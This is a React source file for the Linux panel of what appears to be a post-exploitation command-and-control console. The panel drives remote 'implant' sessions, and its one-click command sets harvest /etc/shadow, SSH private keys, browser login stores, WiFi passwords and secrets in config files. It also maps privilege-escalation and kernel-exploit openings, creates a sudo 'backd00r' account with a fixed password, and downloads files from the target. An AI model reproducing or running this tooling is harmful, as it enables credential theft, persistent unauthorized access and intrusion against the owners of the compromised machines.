import { useState, useRef } from 'react'
import { useAPI, apiPost, apiFetch } from '../hooks/useAPI'
import type { Session } from '../types'
import { Monitor, RefreshCw, Terminal, FolderOpen, Send, Loader,
         Download, Copy, CheckCheck, ChevronRight, Shield } from 'lucide-react'

interface ExecResult  { stdout: string; stderr: string; exit_code: number }
interface FileInfo    { name: string; is_dir: boolean; size: number; mod_time: number }
interface LsResp      { path: string; files: FileInfo[] }
interface OutputEntry { cmd: string; result: string; ok: boolean; ts: number }

function fmtBytes(b: number) {
  if (b >= 1 << 20) return `${(b / (1 << 20)).toFixed(1)}M`
  if (b >= 1024)    return `${(b / 1024).toFixed(1)}K`
  return `${b}B`
}
function joinUnix(base: string, name: string) {
  return base.replace(/\/+$/, '') + '/' + name
}
function parentUnix(p: string) {
  if (p === '/') return '/'
  const trimmed = p.replace(/\/+$/, '')
  const idx = trimmed.lastIndexOf('/')
  return idx <= 0 ? '/' : trimmed.slice(0, idx)
}

// ─── Linux capability tabs ────────────────────────────────────────────────────

const TABS = [
  { id: 'recon',   label: '🔍 Recon'       },
  { id: 'privesc', label: '⬆️ PrivEsc'     },
  { id: 'creds',   label: '🔑 Credentials' },
  { id: 'network', label: '🌐 Network'     },
  { id: 'files',   label: '📁 Files'       },
  { id: 'persist', label: '🔒 Persistence' },
  { id: 'lpe',     label: '💀 LPE'         },
  { id: 'browser', label: '📂 File Browser'},
] as const
type LinTab = typeof TABS[number]['id']

const CAP: Record<Exclude<LinTab,'browser'>, { icon: string; l: string; c: string }[]> = {
  recon: [
    { icon: '👤', l: 'whoami / id',          c: 'id && groups' },
    { icon: '💻', l: 'OS / Kernel',           c: 'uname -a && cat /etc/os-release 2>/dev/null || cat /etc/issue' },
    { icon: '🔧', l: 'CPU / Memory',          c: 'nproc && free -h && cat /proc/cpuinfo | grep "model name" | head -1' },
    { icon: '⏱️', l: 'Uptime / Users',        c: 'uptime && who && last | head -15' },
    { icon: '👥', l: 'Local Users',           c: 'cat /etc/passwd | grep -v "nologin\\|false" | cut -d: -f1,3,4,6,7' },
    { icon: '🔑', l: 'Sudoers',               c: 'sudo -l 2>/dev/null && cat /etc/sudoers 2>/dev/null | grep -v "^#" | grep -v "^$"' },
    { icon: '📋', l: 'Processes',             c: 'ps auxf | head -40' },
    { icon: '⚙️', l: 'Services (systemd)',    c: 'systemctl list-units --type=service --state=running 2>/dev/null | head -30' },
    { icon: '📦', l: 'Installed Packages',    c: '(dpkg -l 2>/dev/null || rpm -qa 2>/dev/null) | head -30' },
    { icon: '🔌', l: 'Loaded Kernel Mods',   c: 'lsmod | head -30' },
    { icon: '🛡️', l: 'SELinux / AppArmor',   c: 'cat /sys/kernel/security/lsm 2>/dev/null; sestatus 2>/dev/null; apparmor_status 2>/dev/null | head -10' },
    { icon: '📝', l: 'SUID / SGID Binaries', c: 'find / -perm -4000 -o -perm -2000 2>/dev/null | grep -v proc | head -30' },
  ],
  privesc: [
    { icon: '🎭', l: 'sudo -l',              c: 'sudo -l 2>&1' },
    { icon: '🔑', l: 'SUID Binaries',        c: 'find / -perm -u=s -type f 2>/dev/null | xargs ls -la 2>/dev/null' },
    { icon: '🧩', l: 'Writable /etc',        c: 'find /etc -writable -type f 2>/dev/null' },
    { icon: '📂', l: 'World-Writable Dirs',  c: 'find / -xdev -type d \\( -perm -0002 -a ! -perm -1000 \\) 2>/dev/null | head -20' },
    { icon: '📝', l: 'Cron Jobs',            c: 'cat /etc/crontab; ls -la /etc/cron.*/ 2>/dev/null; crontab -l 2>/dev/null' },
    { icon: '🌍', l: 'PATH Hijack Check',    c: 'echo $PATH; for p in $(echo $PATH | tr : " "); do ls -la $p 2>/dev/null | grep -v "^total" | grep -E "^d?rwxrwx"; done' },
    { icon: '🔐', l: 'Capabilities',         c: 'getcap -r / 2>/dev/null' },
    { icon: '💾', l: 'NFS Mounts',           c: 'cat /etc/exports 2>/dev/null; showmount -e localhost 2>/dev/null' },
    { icon: '📁', l: 'Readable /root',       c: 'ls -la /root 2>/dev/null; find /root -readable 2>/dev/null | head -10' },
    { icon: '🐳', l: 'Docker / LXC Check',  c: 'id | grep docker; cat /proc/1/cgroup 2>/dev/null; ls /.dockerenv 2>/dev/null && echo IN_CONTAINER' },
    { icon: '⚡', l: 'LD_PRELOAD Check',     c: 'cat /etc/ld.so.conf.d/*.conf 2>/dev/null; ls -la /etc/ld.so.preload 2>/dev/null; env | grep LD_' },
    { icon: '🔧', l: 'Writable Svc Dirs',   c: 'find /etc/systemd/system/ -writable 2>/dev/null; systemctl list-units --type=service --all 2>/dev/null | head -20' },
  ],
  creds: [
    { icon: '🔑', l: 'SSH Keys',             c: 'find /home /root -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null; cat /root/.ssh/id_rsa 2>/dev/null | head -5' },
    { icon: '📜', l: 'SSH Auth Keys',        c: 'find /home /root -name "authorized_keys" 2>/dev/null -exec cat {} \\;' },
    { icon: '🔒', l: 'Shadow File',          c: 'cat /etc/shadow 2>/dev/null || echo needs-root' },
    { icon: '📋', l: 'Bash Histories',       c: 'cat /home/*/.bash_history /root/.bash_history 2>/dev/null | head -50' },
    { icon: '🌍', l: 'Browser Creds',        c: 'find /home -path "*/firefox/*/logins.json" -o -path "*/chromium/*/Login Data" -o -path "*/.config/google-chrome/*/Login Data" 2>/dev/null' },
    { icon: '⚙️', l: 'Config Files w/ Creds', c: 'find /home /etc /var /opt -name "*.conf" -o -name ".env" -o -name "config.php" -o -name "settings.py" 2>/dev/null | xargs grep -l "password\\|passwd\\|secret\\|token" 2>/dev/null | head -15' },
    { icon: '🗄️', l: 'DB Credentials',      c: 'grep -r "password\\|passwd\\|db_pass" /var/www /opt /srv /home 2>/dev/null | grep -v ".git\\|Binary" | head -15' },
    { icon: '🔑', l: 'GPG Keys',             c: 'gpg --list-keys 2>/dev/null; find /home /root -name "*.gpg" 2>/dev/null' },
    { icon: '🌐', l: 'WiFi Creds (NM)',      c: 'grep -r "psk\\|password" /etc/NetworkManager/system-connections/ 2>/dev/null' },
    { icon: '📦', l: 'Docker / Compose Secrets', c: 'find / -name "*.env" -o -name "docker-compose.yml" 2>/dev/null | xargs grep -l "password\\|secret\\|token" 2>/dev/null | head -10' },
  ],
  network: [
    { icon: '🌐', l: 'IP Addresses',         c: 'ip addr show 2>/dev/null || ifconfig -a' },
    { icon: '🗺️', l: 'ARP Table',           c: 'arp -an 2>/dev/null || ip neigh show' },
    { icon: '🔌', l: 'Listening Ports',      c: 'ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null' },
    { icon: '🛤️', l: 'Routing Table',       c: 'ip route show 2>/dev/null || route -n' },
    { icon: '🌍', l: 'DNS Config',           c: 'cat /etc/resolv.conf; cat /etc/hosts' },
    { icon: '🔥', l: 'Firewall Rules',       c: 'iptables -L -n -v 2>/dev/null; nft list ruleset 2>/dev/null' },
    { icon: '🔍', l: 'Active Connections',   c: 'ss -antp 2>/dev/null || netstat -antp 2>/dev/null | head -40' },
    { icon: '🏠', l: 'Hosts File',           c: 'cat /etc/hosts' },
    { icon: '🌐', l: 'Proxy Settings',       c: 'env | grep -i "proxy\\|http_proxy\\|https_proxy"; cat /etc/environment 2>/dev/null | grep -i proxy' },
    { icon: '📶', l: 'Unix Sockets',         c: 'ss -xlnp 2>/dev/null | head -20' },
  ],
  files: [
    { icon: '🏠', l: 'Home Directories',     c: 'ls -la /home/ && ls -la /root/ 2>/dev/null' },
    { icon: '📝', l: 'Recent Files',         c: 'find /home /tmp /var/tmp -mtime -7 -type f 2>/dev/null | head -30' },
    { icon: '📄', l: 'Find Passwords',       c: 'grep -rl "password\\|passwd\\|secret" /home /etc /var/www 2>/dev/null | head -20' },
    { icon: '🗂️', l: 'Temp Directories',    c: 'ls -la /tmp/ /var/tmp/ /dev/shm/ 2>/dev/null' },
    { icon: '📦', l: 'Backup Files',         c: 'find / -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*.orig" 2>/dev/null | grep -v proc | head -20' },
    { icon: '🔑', l: 'Private Keys',         c: 'find / -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.pfx" 2>/dev/null | grep -v "proc\\|sys\\|snap" | head -15' },
    { icon: '💾', l: 'Database Files',       c: 'find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | grep -v "proc\\|sys\\|snap" | head -15' },
    { icon: '🌐', l: 'Web Roots',            c: 'ls -la /var/www/html/ /srv/www/ 2>/dev/null | head -20' },
    { icon: '📋', l: 'Log Files',            c: 'ls -lSh /var/log/ | head -20' },
    { icon: '🔌', l: 'Cron Files',           c: 'ls -la /var/spool/cron/crontabs/ 2>/dev/null; ls -la /etc/cron*' },
  ],
  persist: [
    { icon: '🔧', l: 'Systemd Services',     c: 'ls -la /etc/systemd/system/ | head -20; systemctl list-units --type=service --all | grep loaded | head -20' },
    { icon: '📝', l: 'Cron Jobs (All)',      c: 'crontab -l 2>/dev/null; cat /etc/crontab; ls /etc/cron.d/ && cat /etc/cron.d/* 2>/dev/null' },
    { icon: '🔌', l: 'Init Scripts',         c: 'ls -la /etc/init.d/ && cat /etc/rc.local 2>/dev/null' },
    { icon: '🏃', l: 'Shell Profiles',       c: 'cat /etc/bash.bashrc /etc/profile /root/.bashrc 2>/dev/null | head -40' },
    { icon: '🔑', l: 'SSH Config',           c: 'cat /etc/ssh/sshd_config | grep -v "^#" | grep -v "^$"; ls -la /root/.ssh/ 2>/dev/null' },
    { icon: '👤', l: 'Add Backdoor User',    c: 'useradd -m -s /bin/bash -G sudo backd00r 2>/dev/null && echo "backd00r:P@ssw0rd123" | chpasswd 2>/dev/null && echo done || echo needs-root' },
    { icon: '🌐', l: 'Check Web Shells',     c: 'find /var/www /srv /opt -name "*.php" -newer /var/www/html/index.php 2>/dev/null | head -10' },
    { icon: '🔐', l: 'LD_PRELOAD Persist',   c: 'cat /etc/ld.so.preload 2>/dev/null; ls -la /etc/ld.so.conf.d/' },
    { icon: '⚡', l: 'Socket / Timer Units', c: 'systemctl list-sockets 2>/dev/null | head -20; systemctl list-timers 2>/dev/null | head -10' },
    { icon: '📦', l: 'APT Hook Check',       c: 'ls -la /etc/apt/apt.conf.d/ 2>/dev/null; cat /etc/apt/apt.conf.d/* 2>/dev/null | grep -i "dpkg\\|command\\|exec" | head -10' },
  ],
  lpe: [
    { icon: '💉', l: 'CVE-2021-4034 (pkexec)', c: '[ -f /usr/bin/pkexec ] && ls -la /usr/bin/pkexec && pkexec --version 2>&1 || echo not-found' },
    { icon: '💀', l: 'CVE-2022-0847 (DirtyPipe)', c: 'uname -r | awk -F. \'{if ($1>=5 && $2>=8) print "POTENTIALLY_VULNERABLE"; else print "likely-not-vulnerable"}\'' },
    { icon: '🔥', l: 'CVE-2016-5195 (DirtyCow)', c: 'uname -r; cat /proc/version' },
    { icon: '🐳', l: 'Docker Escape Check',   c: 'cat /proc/1/cgroup | grep docker; ls /.dockerenv 2>/dev/null; [ -w /var/run/docker.sock ] && echo DOCKER_SOCK_WRITABLE' },
    { icon: '📦', l: 'sudo CVE-2021-3156',    c: 'sudoedit -s / 2>&1 | grep -q "usage" && echo VULNERABLE || echo patched-or-not-sudo' },
    { icon: '🔑', l: 'GTFOBins Binaries',     c: 'for b in vim nano python python3 perl ruby lua awk find nmap tee cp mv wget curl bash; do which $b 2>/dev/null && echo "$b found"; done' },
    { icon: '🧩', l: 'Writable /etc/passwd',  c: 'ls -la /etc/passwd; [ -w /etc/passwd ] && echo WRITABLE_PASSWD || echo not-writable' },
    { icon: '🌍', l: 'NFS no_root_squash',    c: 'cat /etc/exports 2>/dev/null | grep no_root_squash' },
    { icon: '💾', l: 'Weak Cron Permissions', c: 'for f in /etc/crontab /etc/cron.d/* /var/spool/cron/*; do [ -w "$f" ] && echo "WRITABLE: $f"; done 2>/dev/null' },
    { icon: '🔧', l: 'Kernel Version',        c: 'uname -r; lsb_release -a 2>/dev/null' },
  ],
}

// ─── Component ────────────────────────────────────────────────────────────────

interface Props { onOpenTerminal: (id: string, name?: string) => void }

export default function Linux({ onOpenTerminal }: Props) {
  const { data, loading, error, refresh } = useAPI<Session[]>('/api/sessions', 5_000)

  const sessions = (data ?? []).filter(s => {
    const os = (s.os ?? '').toLowerCase()
    return os.includes('linux')  || os.includes('ubuntu') || os.includes('debian') ||
           os.includes('kali')   || os.includes('fedora') || os.includes('centos') ||
           os.includes('rhel')   || os.includes('arch')   || os.includes('alpine')
  })

  const [selectedId, setSelectedId] = useState<string | null>(null)
  const [activeTab,  setActiveTab]  = useState<LinTab>('recon')
  const [executing,  setExecuting]  = useState(false)
  const [outputs,    setOutputs]    = useState<OutputEntry[]>([])
  const [customCmd,  setCustomCmd]  = useState('')
  const [copied,     setCopied]     = useState<string | null>(null)

  // file browser
  const [fsPath,    setFsPath]    = useState('/')
  const [fsData,    setFsData]    = useState<LsResp | null>(null)
  const [fsLoading, setFsLoading] = useState(false)

  const selected = sessions.find(s => s.id === selectedId) ?? null

  async function exec(cmd: string, label?: string) {
    if (!selectedId) return
    setExecuting(true)
    try {
      const r = await apiPost<ExecResult>(`/api/sessions/${selectedId}/execute`, { command: cmd })
      const out = (r.stdout || r.stderr || '(no output)').slice(0, 4000)
      setOutputs(prev => [{ cmd: label ?? cmd.slice(0, 60), result: out, ok: r.exit_code === 0, ts: Date.now() }, ...prev.slice(0, 19)])
    } catch (e) {
      setOutputs(prev => [{ cmd: label ?? cmd.slice(0, 60), result: String(e), ok: false, ts: Date.now() }, ...prev.slice(0, 19)])
    } finally { setExecuting(false) }
  }

  async function browseFs(path: string) {
    if (!selectedId) return
    setFsLoading(true)
    try {
      const ls = await apiFetch<LsResp>(`/api/sessions/${selectedId}/ls?path=${encodeURIComponent(path)}`)
      setFsPath(ls.path); setFsData(ls)
    } catch (e) { exec(`ls -la "${path}"`, `ls ${path}`) }
    finally { setFsLoading(false) }
  }

  function downloadFile(path: string) {
    if (!selectedId) return
    window.open(`/api/sessions/${selectedId}/download?path=${encodeURIComponent(path)}`, '_blank')
  }

  function copy(text: string, key: string) {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(key); setTimeout(() => setCopied(null), 1500)
    })
  }

  const fsFiles = (fsData?.files ?? []).filter(f => f.name !== '.' && f.name !== '..')

  return (
    <div className="flex flex-col gap-3 h-full">

      {/* ── Header ──────────────────────────────────────────────────────── */}
      <div className="flex items-center justify-between shrink-0">
        <h2 className="font-bold text-lg flex items-center gap-2 text-text">
          <span className="text-xl">🐧</span> Linux
          <span className="text-muted text-sm font-normal">({sessions.length} device{sessions.length !== 1 ? 's' : ''})</span>
        </h2>
        <button onClick={refresh} className="flex items-center gap-1 text-muted hover:text-text text-[11px] px-2 py-1 rounded border border-border">
          <RefreshCw size={11} className={loading ? 'animate-spin' : ''} /> Refresh
        </button>
      </div>

      <div className="flex gap-3 flex-1 min-h-0">

        {/* ── Left: device list ──────────────────────────────────────────── */}
        <div className="w-52 shrink-0 flex flex-col gap-1">
          <div className="text-[9px] text-muted uppercase tracking-widest mb-1 px-1">Linux Devices</div>
          {sessions.length === 0 ? (
            <div className="bg-surface border border-border rounded-lg p-4 text-center">
              <Monitor size={24} className="text-muted mx-auto mb-2" />
              <p className="text-muted text-[10px]">No Linux sessions</p>
              <p className="text-muted text-[9px] mt-1">Run implant on target</p>
            </div>
          ) : sessions.map(s => (
            <button key={s.id}
              onClick={() => { setSelectedId(s.id); setOutputs([]); setFsPath('/'); setFsData(null); setActiveTab('recon') }}
              className={`w-full text-left px-3 py-2.5 rounded-lg border transition-all ${
                s.id === selectedId
                  ? 'border-primary bg-primary/10 text-text'
                  : 'border-border bg-surface text-muted hover:text-text hover:border-border/80'
              }`}>
              <div className="flex items-center gap-1.5 mb-0.5">
                <span className="text-sm">🐧</span>
                <span className="text-xs font-semibold truncate">{s.name || s.hostname}</span>
              </div>
              <div className="text-[10px] text-muted truncate pl-5">{s.remote_address}</div>
              <div className="text-[10px] text-muted truncate pl-5">{s.username}@{s.hostname}</div>
              <div className="text-[10px] text-muted truncate pl-5">{s.os} {s.arch}</div>
            </button>
          ))}
          {error && <p className="text-danger text-[10px] px-1">{error}</p>}
        </div>

        {/* ── Right: capability panel ──────────────────────────────────── */}
        {!selectedId ? (
          <div className="flex-1 bg-surface border border-border rounded-lg flex flex-col items-center justify-center gap-3 p-8 text-center">
            <Monitor size={48} className="text-border" />
            <div className="text-muted text-sm">Select a Linux session to begin</div>
            <div className="text-muted text-xs max-w-xs leading-relaxed">
              Connect a Linux implant, then select the session from the panel on the left to access post-exploitation capabilities.
            </div>
          </div>
        ) : (
          <div className="flex-1 flex flex-col min-h-0 bg-surface border border-border rounded-lg overflow-hidden">

            {/* Session header */}
            <div className="shrink-0 flex items-center justify-between px-4 py-2.5 border-b border-border">
              <div className="flex items-center gap-2">
                <span className="text-lg">🐧</span>
                <div>
                  <div className="text-xs font-semibold text-text">{selected?.name || selected?.hostname}</div>
                  <div className="text-[10px] text-muted">{selected?.username}@{selected?.hostname} · {selected?.remote_address} · {selected?.os} {selected?.arch}</div>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <button
                  onClick={() => onOpenTerminal(selectedId, selected?.name || selected?.hostname)}
                  className="flex items-center gap-1.5 px-2.5 py-1 rounded text-[11px] border border-border text-muted hover:border-primary/40 hover:text-primary transition-colors">
                  <Terminal size={11} /> Terminal
                </button>
                <span className="w-2 h-2 rounded-full bg-primary animate-pulse" title="Live session" />
              </div>
            </div>

            {/* Tabs */}
            <div className="shrink-0 flex border-b border-border overflow-x-auto">
              {TABS.map(t => (
                <button key={t.id}
                  onClick={() => { setActiveTab(t.id); if (t.id === 'browser' && !fsData) browseFs(fsPath) }}
                  className={`px-3 py-2 text-[11px] whitespace-nowrap transition-colors border-b-2 ${
                    activeTab === t.id
                      ? 'border-primary text-primary font-semibold'
                      : 'border-transparent text-muted hover:text-text'
                  }`}>
                  {t.label}
                </button>
              ))}
            </div>

            {/* Content */}
            <div className="flex-1 flex flex-col min-h-0 overflow-hidden">

              {activeTab === 'browser' ? (
                /* ── File Browser ─────────────────────────────────────────── */
                <div className="flex-1 flex flex-col min-h-0">
                  <div className="shrink-0 flex items-center gap-2 px-3 py-2 border-b border-border text-xs bg-bg/40">
                    <FolderOpen size={12} className="text-primary" />
                    <span className="text-muted font-mono flex-1 truncate">{fsPath}</span>
                    <button onClick={() => browseFs(parentUnix(fsPath))}
                      className="text-muted hover:text-text flex items-center gap-1">
                      <ChevronRight size={11} className="rotate-180" /> Up
                    </button>
                    <button onClick={() => browseFs(fsPath)} className="text-muted hover:text-primary">
                      <RefreshCw size={11} className={fsLoading ? 'animate-spin' : ''} />
                    </button>
                  </div>
                  <div className="flex-1 overflow-y-auto">
                    {fsLoading ? (
                      <div className="flex items-center justify-center p-6">
                        <Loader size={16} className="text-muted animate-spin" />
                      </div>
                    ) : fsFiles.length === 0 ? (
                      <div className="p-4 text-muted text-xs text-center">Empty directory</div>
                    ) : (
                      fsFiles.map(f => (
                        <div key={f.name}
                          className="flex items-center gap-2 px-3 py-1.5 border-b border-border/30 hover:bg-white/5 group">
                          <span className="text-sm">{f.is_dir ? '📁' : '📄'}</span>
                          <button
                            onClick={() => f.is_dir && browseFs(joinUnix(fsPath, f.name))}
                            className={`flex-1 text-left text-xs truncate ${
                              f.is_dir ? 'text-accent hover:text-primary cursor-pointer' : 'text-text cursor-default'
                            }`}>
                            {f.name}
                          </button>
                          {!f.is_dir && <span className="text-[10px] text-muted shrink-0">{fmtBytes(f.size)}</span>}
                          {!f.is_dir && (
                            <button
                              onClick={() => downloadFile(joinUnix(fsPath, f.name))}
                              className="shrink-0 text-muted hover:text-primary transition-colors opacity-0 group-hover:opacity-100"
                              title="Download">
                              <Download size={11} />
                            </button>
                          )}
                        </div>
                      ))
                    )}
                  </div>
                </div>
              ) : (
                /* ── Capability tab ───────────────────────────────────────── */
                <>
                  {/* Command grid */}
                  <div className="shrink-0 p-3 grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-2 border-b border-border overflow-y-auto" style={{ maxHeight: '45%' }}>
                    {CAP[activeTab as Exclude<LinTab,'browser'>].map(cap => (
                      <button key={cap.l}
                        disabled={executing}
                        onClick={() => exec(cap.c, cap.l)}
                        className="flex items-center gap-2 px-3 py-2 rounded border border-border bg-bg hover:border-primary/40 hover:bg-primary/5 transition-all text-left disabled:opacity-50 group">
                        <span className="text-sm leading-none shrink-0">{cap.icon}</span>
                        <span className="text-[11px] text-muted group-hover:text-text transition-colors leading-tight">{cap.l}</span>
                      </button>
                    ))}
                  </div>

                  {/* Custom command */}
                  <div className="shrink-0 flex items-center gap-2 px-3 py-2 border-b border-border">
                    <span className="text-muted text-xs font-mono select-none">$</span>
                    <input
                      value={customCmd}
                      onChange={e => setCustomCmd(e.target.value)}
                      onKeyDown={e => { if (e.key === 'Enter' && customCmd.trim()) { exec(customCmd.trim()); setCustomCmd('') } }}
                      placeholder="Custom shell command…"
                      className="flex-1 bg-transparent text-xs text-text placeholder-muted outline-none font-mono"
                    />
                    <button
                      onClick={() => { if (customCmd.trim()) { exec(customCmd.trim()); setCustomCmd('') } }}
                      disabled={executing || !customCmd.trim()}
                      className="text-muted hover:text-primary transition-colors disabled:opacity-40">
                      {executing ? <Loader size={12} className="animate-spin" /> : <Send size={12} />}
                    </button>
                  </div>

                  {/* Output */}
                  <div className="flex-1 overflow-y-auto p-3 font-mono text-[11px] space-y-3">
                    {outputs.length === 0 ? (
                      <div className="text-muted text-center py-8">Select a command above to execute on the target</div>
                    ) : (
                      outputs.map((entry, i) => (
                        <div key={i} className="border border-border/50 rounded bg-bg overflow-hidden">
                          <div className={`flex items-center justify-between px-3 py-1.5 border-b border-border/50 ${entry.ok ? 'bg-primary/5' : 'bg-danger/5'}`}>
                            <div className="flex items-center gap-2">
                              <span className={entry.ok ? 'text-primary' : 'text-danger'}>{entry.ok ? '✓' : '✗'}</span>
                              <span className="text-accent font-semibold">{entry.cmd}</span>
                              <span className="text-muted text-[9px]">{new Date(entry.ts).toLocaleTimeString()}</span>
                            </div>
                            <button onClick={() => copy(entry.result, `out-${i}`)} className="text-muted hover:text-primary transition-colors">
                              {copied === `out-${i}` ? <CheckCheck size={11} /> : <Copy size={11} />}
                            </button>
                          </div>
                          <pre className="p-3 text-text whitespace-pre-wrap break-all max-h-64 overflow-y-auto leading-relaxed">{entry.result}</pre>
                        </div>
                      ))
                    )}
                  </div>
                </>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
